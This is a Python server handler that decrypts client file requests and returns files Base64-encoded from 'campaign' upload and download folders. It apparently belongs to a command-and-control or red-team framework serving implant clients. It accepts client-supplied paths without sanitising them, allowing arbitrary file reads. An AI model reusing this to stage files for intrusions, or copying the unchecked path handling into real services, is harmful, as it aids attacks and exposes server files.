import os
import base64
import json
import logging
from handlers.base_handler import BaseHandler

logger = logging.getLogger(__name__)

class FileDownloadHandler(BaseHandler):
    """Handler for file download requests from clients"""
    
    def handle(self):
        """Process file download request from client"""
        # Get content data
        content_length = int(self.headers.get('Content-Length', 0))
        if content_length == 0:
            self.send_error_response(400, "Missing content")
            return
            
        encrypted_data = self.request_handler.rfile.read(content_length).decode('utf-8')
        
        # Identify the client
        client_id = self.identify_client()
                    
        try:
            # Decrypt the file request data
            if client_id:
                file_request = self.crypto_helper.decrypt(encrypted_data, client_id)
            else:
                file_request = self.crypto_helper.decrypt(encrypted_data)
            
            # Process the file request
            response = self._process_file_request(client_id, file_request)
            
            # Encrypt the response
            if client_id:
                encrypted_response = self.crypto_helper.encrypt(json.dumps(response), client_id)
            else:
                encrypted_response = self.crypto_helper.encrypt(json.dumps(response))
            
            # Send the encrypted response
            self.send_response(200, "application/json", encrypted_response)
            
        except Exception as e:
            logger.error(f"Error handling file download request: {e}")
            
            # Send error response
            error_response = {
                "Status": "Error",
                "Message": str(e)
            }
            
            try:
                if client_id:
                    encrypted_error = self.crypto_helper.encrypt(json.dumps(error_response), client_id)
                else:
                    encrypted_error = self.crypto_helper.encrypt(json.dumps(error_response))
                    
                self.send_response(200, "application/json", encrypted_error)
            except:
                self.send_error_response(500, "Server Error")
            
    def _process_file_request(self, client_id, file_request_json):
        """
        Process the file request and return the file data
        
        Args:
            client_id: The client ID
            file_request_json: JSON string containing the file request information
            
        Returns:
            Dictionary with file response information
        """
        try:
            # Parse the file request
            file_request = json.loads(file_request_json)
            file_path = file_request.get('FilePath')
            destination = file_request.get('Destination')
            
            if not file_path:
                return {
                    "Status": "Error",
                    "Message": "No file path specified"
                }
            
            # Log the request
            self.log_message(f"File download request from {client_id or self.client_address[0]}: {file_path}")
            if client_id:
                self.client_manager.log_event(client_id, "File Download Request", f"Requested file: {file_path}")
            
            # Determine the file path in the campaign folders
            campaign_folder = self.get_campaign_folder()
            downloads_folder = os.path.join(campaign_folder, "downloads")
            uploads_folder = os.path.join(campaign_folder, "uploads")
            
            # Look for the file in several possible locations
            possible_locations = [
                file_path,  # Direct path
                os.path.join(downloads_folder, file_path),  # In downloads folder
                os.path.join(uploads_folder, file_path),  # In uploads folder
                os.path.join(campaign_folder, file_path),  # In campaign folder
            ]
            
            # If client_id is available, also check in client-specific upload/download folders
            if client_id:
                possible_locations.append(os.path.join(uploads_folder, client_id, file_path))
                possible_locations.append(os.path.join(downloads_folder, client_id, file_path))
                
                # Try with just the filename in the client folders
                filename = os.path.basename(file_path)
                possible_locations.append(os.path.join(uploads_folder, client_id, filename))
                possible_locations.append(os.path.join(downloads_folder, client_id, filename))
            
            # Try each location
            actual_path = None
            for path in possible_locations:
                if os.path.exists(path) and os.path.isfile(path):
                    actual_path = path
                    break
            
            if not actual_path:
                return {
                    "Status": "Error",
                    "Message": f"File not found: {file_path}"
                }
            
            # Read the file content as bytes and encode as Base64
            with open(actual_path, 'rb') as f:
                file_content = f.read()
            
            file_size = len(file_content)
            file_content_base64 = base64.b64encode(file_content).decode('utf-8')
            
            # Log the successful file access
            self.log_message(f"File found at {actual_path}, sending to client ({file_size} bytes)")
            if client_id:
                self.client_manager.log_event(client_id, "File Download", f"Sending file: {actual_path} ({file_size} bytes)")
            
            # Create and return the response
            return {
                "Status": "Success",
                "FileName": os.path.basename(actual_path),
                "FileSize": file_size,
                "FileContent": file_content_base64
            }
            
        except json.JSONDecodeError:
            return {
                "Status": "Error",
                "Message": "Invalid file request format"
            }
        except Exception as e:
            logger.error(f"Error processing file request: {e}")
            return {
                "Status": "Error",
                "Message": f"Error processing file request: {str(e)}"
            }